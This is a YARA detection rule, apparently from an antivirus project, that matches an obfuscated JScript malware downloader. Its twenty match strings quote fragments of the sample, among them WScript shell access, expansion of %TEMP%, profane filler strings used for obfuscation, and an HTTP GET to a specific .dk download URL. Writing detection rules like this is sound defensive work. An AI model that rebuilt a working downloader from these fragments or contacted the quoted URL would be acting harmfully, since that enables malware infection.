rule sig_20160428_b75511f5980a5a61e2a7b19f45a4894c {
  meta:
    description = "datamaliciousorder - file 20160428_b75511f5980a5a61e2a7b19f45a4894c.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "dc12d59761733b63104cdbee51d2a5a1fa0c965d75158298b933c69746efb660"

  strings:
    $s1  = "function BvyWomVxbInuTmoOimDor(AkdKakFitHmpFrgNmjPbd, DpiUnpMloFfpJafKdqVlf){TfxWpdTxoJtdTfkIsvEcr = TfxWpdTxoJtdTfkIsvEcr * 1; " ascii
    $s2  = "function ChyXcnYrfLllQzgAvfYtc(EomIbzOylRirEeoRnnTmu){GsaTxtXcuXzoPrcDmcRuv[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s3  = "function JedStqRopCmhQlvAxlUdt() {return GsaTxtXcuXzoPrcDmcRuv[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s4  = "function ChyXcnYrfLllQzgAvfYtc(EomIbzOylRirEeoRnnTmu){GsaTxtXcuXzoPrcDmcRuv[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s5  = "return AkdKakFitHmpFrgNmjPbd - DpiUnpMloFfpJafKdqVlf;};" fullword ascii
    $s6  = "var GsaTxtXcuXzoPrcDmcRuv = function WfxSbrXwmUwmBpyEjiQqs() {return BboBsvBkmRfkPecEjbLpz[PrdQdjFjbKopUneUifRsv](\"WScript\"+\"" ascii
    $s7  = "function BvyWomVxbInuTmoOimDor(AkdKakFitHmpFrgNmjPbd, DpiUnpMloFfpJafKdqVlf){TfxWpdTxoJtdTfkIsvEcr = TfxWpdTxoJtdTfkIsvEcr * 1; " ascii
    $s8  = "var GsaTxtXcuXzoPrcDmcRuv = function WfxSbrXwmUwmBpyEjiQqs() {return BboBsvBkmRfkPecEjbLpz[PrdQdjFjbKopUneUifRsv](\"WScript\"+\"" ascii
    $s9  = "var BboBsvBkmRfkPecEjbLpz = this[\"WScript\"];" fullword ascii
    $s10 = "function JedStqRopCmhQlvAxlUdt() {return GsaTxtXcuXzoPrcDmcRuv[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s11 = "if (MnlClvJkhMpxEyfKyfMes[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s12 = "function QusCehTjsTktMwsDjaKlq() {return ((DwtZstEywVkhZncXjqOhl == true) && (DwtZstEywVkhZncXjqOhl == YhjDvgKjtVzvNsiRbfOkq)) ?" ascii
    $s13 = "MnlClvJkhMpxEyfKyfMes[DurIcsDxuYghBfqNbsZhf](\"G\" + \"ET\", \"http://tribalsnedkeren.dk/n4jca\", false);" fullword ascii
    $s14 = "return BvyWomVxbInuTmoOimDor(1 == 1 ? VbmFxvYexYckGgcCfdRwp : 0, 1 == 1 ? EcpVnnKgwGmqSzsZfiPry : 0);" fullword ascii
    $s15 = "function QusCehTjsTktMwsDjaKlq() {return ((DwtZstEywVkhZncXjqOhl == true) && (DwtZstEywVkhZncXjqOhl == YhjDvgKjtVzvNsiRbfOkq)) ?" ascii
    $s16 = "function IodEwzIbzEnjMbgPgpHyw(ZkbGjjQbuEdlKceBnwFve) {var NvjBtmLzxDewVavDsrHzo = (1, 2, 3, 4, 5, ZkbGjjQbuEdlKceBnwFve); retur" ascii
    $s17 = "function AgaIrfUkmNezGxmSdvBjs()" fullword ascii
    $s18 = "function FftZtzFpvWllMdhXnkClk(){return 23;};" fullword ascii
    $s19 = "var YhjDvgKjtVzvNsiRbfOkq = false;" fullword ascii
    $s20 = "HpyCuhPlhNpjMezKogTgf = true;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}